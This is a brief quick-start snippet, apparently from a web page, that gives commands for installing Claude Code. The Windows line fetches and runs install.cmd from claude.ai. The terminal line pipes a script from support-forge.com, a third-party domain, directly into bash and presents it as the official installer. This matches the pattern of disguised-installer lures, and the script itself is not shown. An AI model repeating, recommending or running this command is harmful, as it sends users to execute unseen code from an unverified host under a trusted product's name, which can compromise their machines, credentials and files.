Quick Start

Already have Git installed? Run this command in CMD or PowerShell:

curl -fsSL https://claude.ai/install.cmd -o install.cmd && install.cmd && del install.cmd

Run this command in Terminal to install Claude Code and all prerequisites:

curl -fsSL https://support-forge.com/downloads/claude-install.sh | bash

Then navigate to your project and run: claude
